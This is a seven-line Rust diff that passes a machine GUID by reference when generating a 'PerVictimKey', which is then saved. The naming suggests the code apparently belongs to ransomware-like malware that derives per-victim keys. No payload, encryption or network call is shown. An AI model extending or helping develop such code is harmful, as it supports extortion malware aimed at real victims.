@@ -159,7 +159,7 @@ fn get_machine_guid() -> Result<Uuid, GetMachineGuidError> {
 }
 
 fn generate_key() -> Result<PerVictimKey, GenerateKeyError> {
-    let key = PerVictimKey::generate(get_machine_guid()?);
+    let key = PerVictimKey::generate(&get_machine_guid()?);
     save_key(&key)?;
     Ok(key)
 }
